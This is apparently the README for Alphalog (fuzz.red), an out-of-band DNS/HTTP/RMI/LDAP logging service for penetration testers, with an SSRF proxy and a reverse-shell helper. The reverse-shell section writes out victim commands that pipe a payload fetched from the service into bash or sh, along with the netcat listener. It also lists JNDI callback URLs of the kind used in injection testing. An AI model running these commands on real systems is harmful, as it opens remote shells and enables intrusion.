[![](https://raw.githubusercontent.com/AlphabugX/Alphalog/main/fuzz.red.jpg)](https://www.fuzz.red/)

# Alphalog (正式开源公测)

DNSLog、httplog、rmilog、ldaplog、jndi 等都支持,完全匿名 产品(fuzz.red)，Alphalog与传统DNSLog不同，更快、更安全。


```bash
  $$$$$$\  $$\           $$\                 $$\                          
 $$  __$$\ $$ |          $$ |                $$ |                         
 $$ /  $$ |$$ | $$$$$$\  $$$$$$$\   $$$$$$\  $$ |      $$$$$$\   $$$$$$\  
 $$$$$$$$ |$$ |$$  __$$\ $$  __$$\  \____$$\ $$ |     $$  __$$\ $$  __$$\ 
 $$  __$$ |$$ |$$ /  $$ |$$ |  $$ | $$$$$$$ |$$ |     $$ /  $$ |$$ /  $$ |
 $$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |$$  __$$ |$$ |     $$ |  $$ |$$ |  $$ |
 $$ |  $$ |$$ |$$$$$$$  |$$ |  $$ |\$$$$$$$ |$$$$$$$$\\$$$$$$  |\$$$$$$$ |
 \__|  \__|\__|$$  ____/ \__|  \__| \_______|\________|\______/  \____$$ |
               $$ |                                             $$\   $$ |
               $$ |                 By:Alphabug                 \$$$$$$  |
               \__|                 Version:0.2022.01.16.01      \______/
```

# Welcome to Fuzz.Red #

![image](https://user-images.githubusercontent.com/27001865/150348452-38595c7d-8f16-4564-a1c7-9a02ed9b57a9.png)

## Install

1. 系统环境
- 任意平台
- Redis数据库

2. 创建config.yaml文件
内容如下
```
domain: alphabug.cn
IP_DNS: VPS地址
IP_JNDI: VPS地址
database: redis:Redis数据库地址:端口:密码
PORT_HTTP: HTTPLOG端口
PORT_JNDI: RMI/LDAP端口
```
例如
```
domain: alphabug.cn
IP_DNS: 192.168.1.7
IP_JNDI: 192.168.1.7
database: redis:192.168.1.3:6379:Alphabug
PORT_HTTP: 80
PORT_JNDI: 5
```

3. Run
```
E:\Code\GolandProjects\Alphalog\output> Alphalog_windows_amd64.exe

  $$$$$$\  $$\           $$\                 $$\
 $$  __$$\ $$ |          $$ |                $$ |
 $$ /  $$ |$$ | $$$$$$\  $$$$$$$\   $$$$$$\  $$ |      $$$$$$\   $$$$$$\
 $$$$$$$$ |$$ |$$  __$$\ $$  __$$\  \____$$\ $$ |     $$  __$$\ $$  __$$\
 $$  __$$ |$$ |$$ /  $$ |$$ |  $$ | $$$$$$$ |$$ |     $$ /  $$ |$$ /  $$ |
 $$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |$$  __$$ |$$ |     $$ |  $$ |$$ |  $$ |
 $$ |  $$ |$$ |$$$$$$$  |$$ |  $$ |\$$$$$$$ |$$$$$$$$\\$$$$$$  |\$$$$$$$ |
 \__|  \__|\__|$$  ____/ \__|  \__| \_______|\________|\______/  \____$$ |
               $$ |                                             $$\   $$ |
               $$ |                 By:Alphabug                 \$$$$$$  |
               \__|                 Version:1.0.0.Releases       \______/
2022/04/30 20:40:09 [Config] Redis Initialization succeeded
2022/04/30 20:40:09 [DNS] Domain: alphabug.cn
2022/04/30 20:40:09 [Redis] Start redis database init
2022/04/30 20:40:09 [DNS] Initialization succeeded
2022/04/30 20:40:09 [JNDI] Start fake reverse server

```


## Usage

1. Get token(`key`) and randomly named subdomain (Expires: 1 Day)

	```bash
	$ curl fuzz.red/get
	{"key":"63d755be-9683-40a9-91fb-b85890155872","subdomain":"oz4e.fuzz.red"}
	```

2. Get logs

	```bash
	$ curl fuzz.red -X POST -d "key=63d755be-9683-40a9-91fb-b85890155872"
	{"code":200,"data":[]}
	```

### DNSLOG

```bash
ping -c 1 oz4e.fuzz.red
```

```bash
$ curl fuzz.red -X POST -d "key=63d755be-9683-40a9-91fb-b85890155872"
{"code":200,"data":["{\"ip\":\"192.168.1.1\",\"reqbody\":[\"\"],\"subdomain\":\"oz4e.fuzz.red.\",\"time\":\"2022-01-14 17:01:17 +0800 CST\",\"type\":\"dns\"}"]} 
```

### HTTPLOG

```bash
curl oz4e.fuzz.red -d "abc"
```

```bash
$ curl fuzz.red -X POST -d "key=63d755be-9683-40a9-91fb-b85890155872" | python -m json.tool
{
"code": 200,
"data": [
	{...}]
}
```

### SSRF

```bash
$ curl -L fuzz.red/ssrf/www.baidu.com/
<!DOCTYPE html>...(www.baidu.com page)...</html>
```


### 反弹shell

```bash
$ curl fuzz.red/sh4ll/ip:port
```

Victim

```bash
$ curl fuzz.red/sh4ll/1.2.3.4:1234 | bash
# or 
$ curl fuzz.red/sh4ll/1.2.3.4:1234 | sh
```

VPS

```bash
$ nc -lvvp 1234
listening on [any] 1234 ...
connect to [1.2.3.4] from fbi.gov [127.0.0.1] 46958
```

### RMI or LDAP 
PATH规则为“sub/text”,sub为子域名的主机头，text为自定义特征
例如：子域名=oz4e.fuzz.red，text=Alphabug
=> oz4e/Alphabug

```bash
rmi://jndi.fuzz.red:5/oz4e/Alphabug
# or
ldap://jndi.fuzz.red:5/oz4e/Alphabug
```
获取log
```bash
$ curl fuzz.red -X POST -d "key=63d755be-9683-40a9-91fb-b85890155872" | python -m json.tool

{
	"code": 200,
	"data": [
		{
			"ip": "1.2.3.4:41584",
			"reqbody": "Alphabug",
			"subdomain": "oz4e.fuzz.red.",
			"time": "2022-01-16 03:40:03 -0500 EST",
			"type": "ldap"
		}
	]
}
```
## 作者有话说

###  项目名称为：Alphalog，作者Alphabug。
采用Go编写开发 DNS服务、Http服务等，后续等待开源。

项目域名为匿名域名，请求接口没有做任何的记录。所有dnslog存活时间为1天，大家可以亲测。

（请勿CC/DDos，服务器特别贵，可能没办法退钱）
       
## 项目日志：
- 2021年12月14日 17:30:35 第一个版本完成
- 2021年12月14日 20:14:57 特别感谢团队成员hexman、Longlone（WaY）测试提出的各类bug。
- 2021年12月14日 20:26:33 上架公测，我是Alphabug欢迎大家提需求，目的就是让dnslog扩展性更高，如果您有建议请邮箱联系我：alphabug@redteam.site
- 2021年12月14日 21:17:15 页面不再更新，Issue 上github吧。项目地址 https://github.com/AlphabugX/Alphalog
- 2022年01月15日 17:07:41 添加httplog功能，升级数据格式。
- 2022年01月15日 17:52:03 添加SSRF辅助功能。
- 2022年01月15日 18:52:42 添加反弹shell功能,支持bash、sh、nc、python、awk、telnet弹shell方法。
- 2022年01月16日 16:45:12 添加RMI、LDAP log功能，引用https://github.com/EmYiQing/JNDIScan核心模块，实现log查询。
- 2022年4月30日 20:26:29 正式开源，进行公测，任何问题，请及时反馈到Issues，在此感谢所有支持Alphalog项目的朋友，由衷的感谢，另外新增短链接功能，优化API。(相关API文档后续公布，欢迎提稿)

## curl 效果日志
![image](https://user-images.githubusercontent.com/27001865/149620709-e02d8876-8320-445c-8cf3-151f653b04b3.png)

## www.fuzz.red 效果
![www fuzz red_(iPhone X)](https://user-images.githubusercontent.com/27001865/149708515-c1dcf244-babe-4948-9418-3760c697010c.png)

![image](https://user-images.githubusercontent.com/27001865/149654871-c93be50f-5e42-4c6a-b1d2-447870285cb5.png)


## Stargazers over time

[![Stargazers over time](https://starchart.cc/AlphabugX/Alphalog.svg)](https://starchart.cc/AlphabugX/Alphalog.svg)
 

## 实时反馈群 

### QQ反馈群


QQ群：727871590

![$XVJBS5Q 5QNTDURQ(AKGU6](https://user-images.githubusercontent.com/27001865/159666679-102374da-b9f9-4324-8485-89f8bbbd7e2b.jpg)

2022.04.11
